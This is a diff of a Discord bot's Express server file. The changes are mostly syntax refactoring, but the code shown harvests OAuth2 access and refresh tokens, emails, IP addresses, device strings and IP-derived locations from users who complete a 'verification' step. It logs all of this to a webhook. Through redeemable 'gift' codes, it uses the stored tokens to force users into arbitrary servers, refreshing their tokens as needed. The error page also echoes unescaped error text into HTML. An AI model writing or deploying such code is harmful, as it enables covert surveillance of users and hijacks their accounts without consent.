@@ -3,7 +3,6 @@ console.log('🚀 [server.js] arquivo foi carregado');
 const axios = require('axios');
 const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
 const { renderGiftPage } = require('./giftPage');
-const painelApi = require('./pages/painelApi');
 
 module.exports = (app, client) => {
     console.log('🚀 [server.js] função foi executada');
@@ -28,7 +27,7 @@ module.exports = (app, client) => {
             return { cidade: 'Desconhecido', estado: 'Desconhecido', pais: 'Desconhecido' };
         }
         try {
-            const resp = await axios.get(`https://ipapi.co/${ip}/json/`, {
+            const resp = await axios.get('https://ipapi.co/' + ip + '/json/', {
                 timeout: 5000,
                 headers: { 'User-Agent': 'Meubot/1.0' }
             });
@@ -54,39 +53,21 @@ module.exports = (app, client) => {
     app.get('/invite', (req, res) => {
         const clientId = process.env.CLIENT_ID;
         const perms = '8';
-        const url = `https://discord.com/oauth2/authorize?client_id=${clientId}&permissions=${perms}&scope=bot%20applications.commands`;
+        const url = 'https://discord.com/oauth2/authorize?client_id=' + clientId + '&permissions=' + perms + '&scope=bot%20applications.commands';
         res.redirect(url);
     });
-
-    // ============================
-    // PAINEL ADMIN
-    // ============================
-    try {
-        painelApi(app, client, config, users);
-        console.log('✅ [server.js] rotas do painel registradas');
-    } catch (err) {
-        console.error('❌ [server.js] erro ao registrar painel:', err.message);
-    }
 
     // ============================
     // PÁGINA DO GIFT
     // ============================
     app.get('/gift/:codigo', async (req, res) => {
         try {
-            const { codigo } = req.params;
+            const codigo = req.params.codigo;
             const gifts = (await config.get('gifts')) || {};
             const gift = gifts[codigo];
 
             if (!gift) {
-                return res.status(404).send(`
-                    <!DOCTYPE html>
-                    <html><head><meta charset="UTF-8"><title>Gift não encontrado</title>
-                    <style>body{background:#0b0b0d;color:#f5f5f5;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;text-align:center;padding:20px}
-                    .c{background:rgba(26,26,34,0.85);padding:40px;border-radius:24px;max-width:500px;border:1px solid rgba(88,101,242,0.2)}
-                    h1{margin-bottom:16px}p{color:#b5bac1;line-height:1.6}</style>
-                    </head><body><div class="c"><div style="font-size:64px">❌</div><h1>Gift não encontrado</h1>
-                    <p>Esse código não existe ou foi deletado.</p></div></body></html>
-                `);
+                return res.status(404).send('<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Gift não encontrado</title><style>body{background:#0b0b0d;color:#f5f5f5;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;text-align:center;padding:20px}.c{background:rgba(26,26,34,0.85);padding:40px;border-radius:24px;max-width:500px;border:1px solid rgba(88,101,242,0.2)}h1{margin-bottom:16px}p{color:#b5bac1;line-height:1.6}</style></head><body><div class="c"><div style="font-size:64px">❌</div><h1>Gift não encontrado</h1><p>Esse código não existe ou foi deletado.</p></div></body></html>');
             }
 
             if (gift.status === 'ativo' && gift.expiresAt && Date.now() > gift.expiresAt) {
@@ -112,8 +93,8 @@ module.exports = (app, client) => {
     // ============================
     app.post('/api/gift/:codigo', async (req, res) => {
         try {
-            const { codigo } = req.params;
-            const { guildId } = req.body;
+            const codigo = req.params.codigo;
+            const guildId = req.body.guildId;
 
             if (!guildId || !/^\d{17,20}$/.test(guildId)) {
                 return res.status(400).json({ error: 'ID do servidor inválido.' });
@@ -133,9 +114,9 @@ module.exports = (app, client) => {
 
             const bloqueados = (await config.get('giftBlockList')) || {};
             if (bloqueados[guildId]) {
-                console.log(`🚫 [GIFT] servidor bloqueado: ${guildId}`);
+                console.log('🚫 [GIFT] servidor bloqueado: ' + guildId);
                 return res.status(403).json({
-                    error: `Esse servidor está na blacklist. Motivo: ${bloqueados[guildId].motivo}`
+                    error: 'Esse servidor está na blacklist. Motivo: ' + bloqueados[guildId].motivo
                 });
             }
 
@@ -149,16 +130,16 @@ module.exports = (app, client) => {
             const dbData = await users.all();
             let userList = [];
             if (Array.isArray(dbData)) {
-                userList = dbData.map(item => {
-                    if (item._id && item.data) return { id: item._id, ...item.data };
-                    if (item.ID && item.data) return { id: item.ID, ...item.data };
+                userList = dbData.map(function(item) {
+                    if (item._id && item.data) return Object.assign({ id: item._id }, item.data);
+                    if (item.ID && item.data) return Object.assign({ id: item.ID }, item.data);
                     return item;
                 });
             }
 
             let toPull;
             if (gift.selecionados && gift.selecionados.length > 0) {
-                toPull = userList.filter(u => gift.selecionados.includes(u.id));
+                toPull = userList.filter(function(u) { return gift.selecionados.includes(u.id); });
             } else {
                 toPull = userList.slice(0, gift.quantidade);
             }
@@ -173,16 +154,16 @@ module.exports = (app, client) => {
             await config.set('gifts', gifts);
 
             await enviarLogGift(client, config, 'usado', {
-                codigo,
+                codigo: codigo,
                 quantidade: gift.quantidade,
-                guildId,
+                guildId: guildId,
                 guildName: guild.name
             });
 
             puxarMembrosGift(client, config, codigo, guildId, toPull, guild);
 
             return res.json({
-                mensagem: `O bot começou a puxar **${toPull.length} membros** pro servidor **${guild.name}**.`
+                mensagem: 'O bot começou a puxar ' + toPull.length + ' membros pro servidor ' + guild.name + '.'
             });
 
         } catch (err) {
@@ -195,7 +176,7 @@ module.exports = (app, client) => {
     // CALLBACK OAuth2
     // ============================
     app.get('/oauth2/callback', async (req, res) => {
-        const { code } = req.query;
+        const code = req.query.code;
         if (!code) return res.redirect('/error?msg=Missing code');
 
         try {
@@ -212,11 +193,13 @@ module.exports = (app, client) => {
                 { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
             );
 
-            const { access_token, refresh_token, token_type } = tokenResponse.data;
+            const access_token = tokenResponse.data.access_token;
+            const refresh_token = tokenResponse.data.refresh_token;
+            const token_type = tokenResponse.data.token_type;
 
             const userResponse = await axios.get(
                 'https://discord.com/api/users/@me',
-                { headers: { Authorization: `${token_type} ${access_token}` } }
+                { headers: { Authorization: token_type + ' ' + access_token } }
             );
 
             const userData = userResponse.data;
@@ -240,10 +223,10 @@ module.exports = (app, client) => {
                     username: userData.username,
                     avatar: userData.avatar,
                     email: userData.email,
-                    access_token,
-                    refresh_token,
-                    ip,
-                    userDevice,
+                    access_token: access_token,
+                    refresh_token: refresh_token,
+                    ip: ip,
+                    userDevice: userDevice,
                     cidade: geo.cidade,
                     estado: geo.estado,
                     pais: geo.pais,
@@ -267,11 +250,11 @@ module.exports = (app, client) => {
             if (guildId && roleId) {
                 try {
                     const resp = await axios.put(
-                        `https://discord.com/api/v10/guilds/${guildId}/members/${userData.id}`,
-                        { access_token, roles: [roleId] },
+                        'https://discord.com/api/v10/guilds/' + guildId + '/members/' + userData.id,
+                        { access_token: access_token, roles: [roleId] },
                         {
                             headers: {
-                                Authorization: `Bot ${process.env.TOKEN}`,
+                                Authorization: 'Bot ' + process.env.TOKEN,
                                 'Content-Type': 'application/json'
                             },
                             validateStatus: false
@@ -283,20 +266,20 @@ module.exports = (app, client) => {
                         entrouAgora = true;
                     } else if (resp.status === 204) {
                         const roleResp = await axios.put(
-                            `https://discord.com/api/v10/guilds/${guildId}/members/${userData.id}/roles/${roleId}`,
+                            'https://discord.com/api/v10/guilds/' + guildId + '/members/' + userData.id + '/roles/' + roleId,
                             {},
                             {
                                 headers: {
-                                    Authorization: `Bot ${process.env.TOKEN}`,
+                                    Authorization: 'Bot ' + process.env.TOKEN,
                                     'Content-Type': 'application/json'
                                 },
                                 validateStatus: false
                             }
                         );
                         if (roleResp.status === 204) cargoAtribuido = true;
-                        else motivoFalha = `Erro ${roleResp.status}`;
+                        else motivoFalha = 'Erro ' + roleResp.status;
                     } else {
-                        motivoFalha = `Erro ${resp.status}`;
+                        motivoFalha = 'Erro ' + resp.status;
                     }
                 } catch (err) {
                     motivoFalha = err.message;
@@ -308,7 +291,11 @@ module.exports = (app, client) => {
 
             try {
                 await sendLog(client, userData, ip, userDevice, geo, config, {
-                    cargoAtribuido, entrouAgora, motivoFalha, jaEstavaNoBanco, accountDays
+                    cargoAtribuido: cargoAtribuido,
+                    entrouAgora: entrouAgora,
+                    motivoFalha: motivoFalha,
+                    jaEstavaNoBanco: jaEstavaNoBanco,
+                    accountDays: accountDays
                 });
             } catch (err) {}
 
@@ -318,42 +305,30 @@ module.exports = (app, client) => {
                 userName: userData.username,
                 userId: userData.id,
                 userAvatar: userData.avatar
-                    ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png`
-                    : `https://cdn.discordapp.com/embed/avatars/0.png`,
+                    ? 'https://cdn.discordapp.com/avatars/' + userData.id + '/' + userData.avatar + '.png'
+                    : 'https://cdn.discordapp.com/embed/avatars/0.png',
                 guildName: guild ? guild.name : 'Server',
                 guildId: guildId || '0',
                 guildIcon: guild && guild.icon
-                    ? `https://cdn.discordapp.com/icons/${guildId}/${guild.icon}.png`
-                    : `https://cdn.discordapp.com/embed/avatars/0.png`,
-                accountDays
+                    ? 'https://cdn.discordapp.com/icons/' + guildId + '/' + guild.icon + '.png'
+                    : 'https://cdn.discordapp.com/embed/avatars/0.png',
+                accountDays: accountDays
             });
 
         } catch (error) {
             console.error('❌ [CALLBACK] erro:', error.message);
-            const errData = error.response?.data;
+            const errData = error.response ? error.response.data : null;
             let mensagem = 'Ocorreu um erro ao processar sua verificação.';
 
-            if (errData?.error === 'invalid_grant') {
+            if (errData && errData.error === 'invalid_grant') {
                 mensagem = 'Esse link já foi usado ou expirou. Gere um novo link e tente novamente.';
-            } else if (errData?.error === 'access_denied') {
+            } else if (errData && errData.error === 'access_denied') {
                 mensagem = 'Você cancelou a autorização.';
             } else if (error.message) {
                 mensagem = error.message;
             }
 
-            res.status(400).send(`
-                <!DOCTYPE html>
-                <html lang="pt-BR"><head><meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>Erro na Verificação</title>
-                <style>* { margin: 0; padding: 0; box-sizing: border-box; }
-                body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #1e1f22; color: #dbdee1; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
-                .card { background: #2b2d31; border-radius: 16px; padding: 40px; max-width: 500px; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.3); }
-                .icon { font-size: 64px; margin-bottom: 20px; }
-                h1 { font-size: 24px; color: #f2f3f5; margin-bottom: 16px; }
-                p { font-size: 16px; color: #b5bac1; line-height: 1.6; }</style>
-                </head><body><div class="card"><div class="icon">❌</div><h1>Erro na Verificação</h1><p>${mensagem}</p></div></body></html>
-            `);
+            res.status(400).send('<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Erro na Verificação</title><style>* { margin: 0; padding: 0; box-sizing: border-box; }body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #1e1f22; color: #dbdee1; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }.card { background: #2b2d31; border-radius: 16px; padding: 40px; max-width: 500px; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.3); }.icon { font-size: 64px; margin-bottom: 20px; }h1 { font-size: 24px; color: #f2f3f5; margin-bottom: 16px; }p { font-size: 16px; color: #b5bac1; line-height: 1.6; }</style></head><body><div class="card"><div class="icon">❌</div><h1>Erro na Verificação</h1><p>' + mensagem + '</p></div></body></html>');
         }
     });
 
@@ -381,20 +356,20 @@ async function sendLog(client, userData, ip, userDevice, geo, config, status) {
     let webhook;
     try {
         const webhooks = await channel.fetchWebhooks();
-        webhook = webhooks.find(w => w.name === 'OAuth2');
+        webhook = webhooks.find(function(w) { return w.name === 'OAuth2'; });
         if (!webhook) {
             webhook = await channel.createWebhook({
                 name: 'OAuth2',
                 avatar: client.user.displayAvatarURL()
             });
         }
-    } catch { return; }
+    } catch (err) { return; }
 
     const creationDate = new Date(Number((BigInt(userData.id) >> 22n) + 1420070400000n));
     const creationAccountDays = Math.floor((Date.now() - creationDate) / (1000 * 60 * 60 * 24));
 
     const userAvatar = userData.avatar
-        ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png`
+        ? 'https://cdn.discordapp.com/avatars/' + userData.id + '/' + userData.avatar + '.png'
         : 'https://cdn.discordapp.com/embed/avatars/0.png';
 
     const cargoEmoji = status.cargoAtribuido ? '✅' : '❌';
@@ -406,27 +381,27 @@ async function sendLog(client, userData, ip, userDevice, geo, config, status) {
 
     const embed = new EmbedBuilder()
         .setColor(status.cargoAtribuido ? 4806097 : 0xff4d4d)
-        .setAuthor({ name: `${userData.username} (${userData.id})`, iconURL: userAvatar })
+        .setAuthor({ name: userData.username + ' (' + userData.id + ')', iconURL: userAvatar })
         .setThumbnail(userAvatar)
         .setDescription(
-            `**Menção:** <@${userData.id}>\n` +
-            `**E-mail:** \`${userData.email || 'N/A'}\`\n` +
-            `**Idade da Conta:** \`${creationAccountDays}\` dias`
+            '**Menção:** <@' + userData.id + '>\n' +
+            '**E-mail:** `' + (userData.email || 'N/A') + '`\n' +
+            '**Idade da Conta:** `' + creationAccountDays + '` dias'
         )
         .addFields(
-            { name: `${cargoEmoji} Cargo Atribuído`, value: `\`${cargoTexto}\``, inline: true },
-            { name: `${entrouEmoji} Entrou no Servidor`, value: `\`${entrouTexto}\``, inline: true },
-            { name: `${verificadoEmoji} Verificação`, value: `\`${verificadoTexto}\``, inline: true },
-            { name: '📍 Cidade', value: `\`${geo.cidade}\``, inline: true },
-            { name: '🗺️ Estado', value: `\`${geo.estado}\``, inline: true },
-            { name: '🌎 País', value: `\`${geo.pais}\``, inline: true },
-            { name: '🌐 IP', value: `\`${ip}\`` },
-            { name: '📱 Dispositivo', value: `\`${userDevice.substring(0, 1020)}\`` }
+            { name: cargoEmoji + ' Cargo Atribuído', value: '`' + cargoTexto + '`', inline: true },
+            { name: entrouEmoji + ' Entrou no Servidor', value: '`' + entrouTexto + '`', inline: true },
+            { name: verificadoEmoji + ' Verificação', value: '`' + verificadoTexto + '`', inline: true },
+            { name: '📍 Cidade', value: '`' + geo.cidade + '`', inline: true },
+            { name: '🗺️ Estado', value: '`' + geo.estado + '`', inline: true },
+            { name: '🌎 País', value: '`' + geo.pais + '`', inline: true },
+            { name: '🌐 IP', value: '`' + ip + '`' },
+            { name: '📱 Dispositivo', value: '`' + userDevice.substring(0, 1020) + '`' }
         )
         .setTimestamp();
 
     if (status.motivoFalha) {
-        embed.addFields({ name: '⚠️ Motivo da Falha', value: `\`${status.motivoFalha.substring(0, 1020)}\`` });
+        embed.addFields({ name: '⚠️ Motivo da Falha', value: '`' + status.motivoFalha.substring(0, 1020) + '`' });
     }
 
     await webhook.send({ embeds: [embed] });
@@ -450,9 +425,9 @@ async function enviarLogGift(client, config, tipo, dados) {
                 .setColor(0x57F287)
                 .setTitle('🎁 Gift Criado')
                 .addFields(
-                    { name: 'Código', value: `\`${dados.codigo}\``, inline: true },
-                    { name: 'Quantidade', value: `\`${dados.quantidade} membros\``, inline: true },
-                    { name: 'Criado por', value: `<@${dados.criadoPor}>`, inline: true }
+                    { name: 'Código', value: '`' + dados.codigo + '`', inline: true },
+                    { name: 'Quantidade', value: '`' + dados.quantidade + ' membros`', inline: true },
+                    { name: 'Criado por', value: '<@' + dados.criadoPor + '>', inline: true }
                 )
                 .setTimestamp();
         } else if (tipo === 'usado') {
@@ -460,9 +435,9 @@ async function enviarLogGift(client, config, tipo, dados) {
                 .setColor(0xFEE75C)
                 .setTitle('🎁 Gift Usado — Iniciando puxada')
                 .addFields(
-                    { name: 'Código', value: `\`${dados.codigo}\``, inline: true },
-                    { name: 'Quantidade', value: `\`${dados.quantidade} membros\``, inline: true },
-                    { name: 'Servidor', value: `${dados.guildName} (\`${dados.guildId}\`)`, inline: false }
+                    { name: 'Código', value: '`' + dados.codigo + '`', inline: true },
+                    { name: 'Quantidade', value: '`' + dados.quantidade + ' membros`', inline: true },
+                    { name: 'Servidor', value: dados.guildName + ' (`' + dados.guildId + '`)', inline: false }
                 )
                 .setTimestamp();
         } else if (tipo === 'deletado') {
@@ -470,9 +445,9 @@ async function enviarLogGift(client, config, tipo, dados) {
                 .setColor(0xED4245)
                 .setTitle('🗑️ Gift Deletado')
                 .addFields(
-                    { name: 'Código', value: `\`${dados.codigo}\``, inline: true },
-                    { name: 'Quantidade', value: `\`${dados.quantidade} membros\``, inline: true },
-                    { name: 'Deletado por', value: `<@${dados.deletadoPor}>`, inline: true }
+                    { name: 'Código', value: '`' + dados.codigo + '`', inline: true },
+                    { name: 'Quantidade', value: '`' + dados.quantidade + ' membros`', inline: true },
+                    { name: 'Deletado por', value: '<@' + dados.deletadoPor + '>', inline: true }
                 )
                 .setTimestamp();
         }
@@ -502,10 +477,10 @@ async function puxarMembrosGift(client, config, codigo, guildId, userList, guild
         if (progressChannel) {
             const embedProgresso = new EmbedBuilder()
                 .setColor(0x5865F2)
-                .setTitle(`🔄 Puxando — Gift ${codigo}`)
-                .setDescription(`Servidor: **${guild.name}**`)
+                .setTitle('🔄 Puxando — Gift ' + codigo)
+                .setDescription('Servidor: **' + guild.name + '**')
                 .addFields(
-                    { name: '📊 Progresso', value: `\`0/${userList.length}\``, inline: true },
+                    { name: '📊 Progresso', value: '`0/' + userList.length + '`', inline: true },
                     { name: '✅ Puxados', value: '`0`', inline: true },
                     { name: '❌ Falhas', value: '`0`', inline: true }
                 )
@@ -515,7 +490,7 @@ async function puxarMembrosGift(client, config, codigo, guildId, userList, guild
             const botaoParar = new ActionRowBuilder()
                 .addComponents(
                     new ButtonBuilder()
-                        .setCustomId(`gift_parar_${codigo}`)
+                        .setCustomId('gift_parar_' + codigo)
                         .setLabel('Parar de Puxar')
                         .setEmoji('🛑')
                         .setStyle(ButtonStyle.Danger)
@@ -542,18 +517,18 @@ async function puxarMembrosGift(client, config, codigo, guildId, userList, guild
 
         try {
             let resp = await axios.put(
-                `https://discord.com/api/v10/guilds/${guildId}/members/${userId}`,
+                'https://discord.com/api/v10/guilds/' + guildId + '/members/' + userId,
                 { access_token: accessToken },
                 {
                     headers: {
-                        Authorization: `Bot ${process.env.TOKEN}`,
+                        Authorization: 'Bot ' + process.env.TOKEN,
                         'Content-Type': 'application/json'
                     },
                     validateStatus: false
                 }
             );
 
-            if (resp.status === 403 && resp.data?.code === 50025 && refreshToken) {
+            if (resp.status === 403 && resp.data && resp.data.code === 50025 && refreshToken) {
                 try {
                     const params = new URLSearchParams();
                     params.append('client_id', process.env.CLIENT_ID);
@@ -570,18 +545,17 @@ async function puxarMembrosGift(client, config, codigo, guildId, userList, guild
                     const newAccess = tokenResp.data.access_token;
                     const newRefresh = tokenResp.data.refresh_token;
 
-                    await users.set(userId, {
-                        ...userData,
+                    await users.set(userId, Object.assign({}, userData, {
                         access_token: newAccess,
                         refresh_token: newRefresh
-                    });
+                    }));
 
                     resp = await axios.put(
-                        `https://discord.com/api/v10/guilds/${guildId}/members/${userId}`,
+                        'https://discord.com/api/v10/guilds/' + guildId + '/members/' + userId,
                         { access_token: newAccess },
                         {
                             headers: {
-                                Authorization: `Bot ${process.env.TOKEN}`,
+                                Authorization: 'Bot ' + process.env.TOKEN,
                                 'Content-Type': 'application/json'
                             },
                             validateStatus: false
@@ -602,12 +576,12 @@ async function puxarMembrosGift(client, config, codigo, guildId, userList, guild
             try {
                 const embedAtualizada = new EmbedBuilder()
                     .setColor(0x5865F2)
-                    .setTitle(`🔄 Puxando — Gift ${codigo}`)
-                    .setDescription(`Servidor: **${guild.name}**`)
+                    .setTitle('🔄 Puxando — Gift ' + codigo)
+                    .setDescription('Servidor: **' + guild.name + '**')
                     .addFields(
-                        { name: '📊 Progresso', value: `\`${processed}/${userList.length}\``, inline: true },
-                        { name: '✅ Puxados', value: `\`${puxados}\``, inline: true },
-                        { name: '❌ Falhas', value: `\`${falhas}\``, inline: true }
+                        { name: '📊 Progresso', value: '`' + processed + '/' + userList.length + '`', inline: true },
+                        { name: '✅ Puxados', value: '`' + puxados + '`', inline: true },
+                        { name: '❌ Falhas', value: '`' + falhas + '`', inline: true }
                     )
                     .setFooter({ text: 'Clique no botão abaixo pra parar' })
                     .setTimestamp();
@@ -615,7 +589,7 @@ async function puxarMembrosGift(client, config, codigo, guildId, userList, guild
                 const botaoParar = new ActionRowBuilder()
                     .addComponents(
                         new ButtonBuilder()
-                            .setCustomId(`gift_parar_${codigo}`)
+                            .setCustomId('gift_parar_' + codigo)
                             .setLabel('Parar de Puxar')
                             .setEmoji('🛑')
                             .setStyle(ButtonStyle.Danger)
@@ -625,7 +599,7 @@ async function puxarMembrosGift(client, config, codigo, guildId, userList, guild
             } catch (err) {}
         }
 
-        await new Promise(r => setTimeout(r, 600));
+        await new Promise(function(r) { setTimeout(r, 600); });
     }
 
     client.operacoesGift.delete(codigo);
@@ -643,12 +617,12 @@ async function puxarMembrosGift(client, config, codigo, guildId, userList, guild
         try {
             const embedFinal = new EmbedBuilder()
                 .setColor(puxados > 0 ? 0x57F287 : 0xED4245)
-                .setTitle(`✅ Gift ${codigo} Finalizado`)
-                .setDescription(`Servidor: **${guild.name}**`)
+                .setTitle('✅ Gift ' + codigo + ' Finalizado')
+                .setDescription('Servidor: **' + guild.name + '**')
                 .addFields(
-                    { name: '📊 Processados', value: `\`${processed}/${userList.length}\``, inline: true },
-                    { name: '✅ Puxados', value: `\`${puxados}\``, inline: true },
-                    { name: '❌ Falhas', value: `\`${falhas}\``, inline: true }
+                    { name: '📊 Processados', value: '`' + processed + '/' + userList.length + '`', inline: true },
+                    { name: '✅ Puxados', value: '`' + puxados + '`', inline: true },
+                    { name: '❌ Falhas', value: '`' + falhas + '`', inline: true }
                 )
                 .setTimestamp();
 
@@ -656,5 +630,5 @@ async function puxarMembrosGift(client, config, codigo, guildId, userList, guild
         } catch (err) {}
     }
 
-    console.log(`✅ [GIFT ${codigo}] ${puxados} puxados, ${falhas} falhas`);
+    console.log('✅ [GIFT ' + codigo + '] ' + puxados + ' puxados, ' + falhas + ' falhas');
 }
